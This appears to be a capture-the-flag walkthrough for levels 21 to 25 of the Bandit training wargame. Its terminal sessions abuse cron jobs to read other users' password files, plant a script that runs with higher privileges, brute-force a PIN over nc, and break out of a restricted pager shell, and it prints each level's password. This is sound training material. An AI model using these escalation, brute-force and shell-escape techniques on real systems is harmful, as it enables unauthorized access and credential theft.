Level 21:

Given:A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
```

bandit21@bandit:/etc/cron.d$ ls -lah
total 48K
drwxr-xr-x   2 root root 4.0K Apr 10 14:24 .
drwxr-xr-x 121 root root  12K Apr 21 12:42 ..
-rw-r--r--   1 root root  123 Apr 10 14:16 clean_tmp
-rw-r--r--   1 root root  120 Apr 10 14:23 cronjob_bandit22
-rw-r--r--   1 root root  122 Apr 10 14:23 cronjob_bandit23
-rw-r--r--   1 root root  120 Apr 10 14:23 cronjob_bandit24
-rw-r--r--   1 root root  201 Apr  8  2024 e2scrub_all
-rwx------   1 root root   52 Apr 10 14:24 otw-tmp-dir
-rw-r--r--   1 root root  102 Mar 31  2024 .placeholder
-rw-r--r--   1 root root  396 Jan  9  2024 sysstat
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
```

`The password level 22 = tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q`

Level 22:

Given:

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.

```
bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23 
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget

```

This script is caculating the md5sum which will is the name of tmp directory password is stored so we can just calculate md5sum for bandit23 to get the password.
```
bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum
8ca319486bfbbc3663ea0fbe81326349  -
bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
bandit22@bandit:/etc/cron.d$ 
```

`The password for next level = 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`

Level 23: 
Given:
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…


In this level we just have to write a script to read password for next level from
/etc/bandit_pass/bandit24 which is owned by bandit 24.

```

bandit23@bandit:/etc/cron.d$ ls
clean_tmp  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir  sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done


```

in above script we can see that script in  are being executed by bandit 24 so now we just have make a script and cp this to /var/spool/bandit24/foo

making tmp directory:
```
bandit23@bandit:/etc/cron.d$ mkdir /tmp/bandit_24_random
bandit23@bandit:/etc/cron.d$ cd /tmp/bandit_24_random
bandit23@bandit:/tmp/bandit_24_random$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/bandit_24_random$ pwd
/tmp/bandit_24_random
bandit23@bandit:/tmp/bandit_24_random$ nano script.sh 
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/bandit_24_random$ cat script.sh 
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/bandit_24_random/pass

bandit23@bandit:/tmp/bandit_24_random$ touch pass
bandit23@bandit:/tmp/bandit_24_random$ chmod 777 -R script.sh 
bandit23@bandit:/tmp/bandit_24_random$ cp script.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/bandit_24_random$ cat pass 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

```

when we copy script to /var/spool/bandit24/foo after 1 mintue we get the password
`the password for level 24 = gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

Level 24:

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

we just have to write a script for brute forcing using loop

script:
```
cat script.sh 
#!/bin/bash

pass="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

{ 
  for pin in $(seq -w 0000 9999); do 
    echo "$pass $pin"
  done 
} | nc localhost 30002


```

After many failed attempts got the password:
```
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

`The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`

Level 25:

Given:
Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.

First of all we have to check what shell is used in bandit 26 
```
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ file /usr/bin/showtext
/usr/bin/showtext: POSIX shell script, ASCII text executable
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
bandit25@bandit:~$ 
```

**It runs more ~/text.txt instead of giving you a bash shell.**

Now we Just have to make our terminal window smaller 

Now we are in vim now we can read /etc/bandit_pass/bandit26 using this command:

`:e /etc/bandit_pass/bandit26`

we got the password in vim

```
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
~                                                                                           
~                                                                                           
~                                                                                           
~                                                                                           
~                                                                                           
~

```

`The password for Level 26 = s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ`

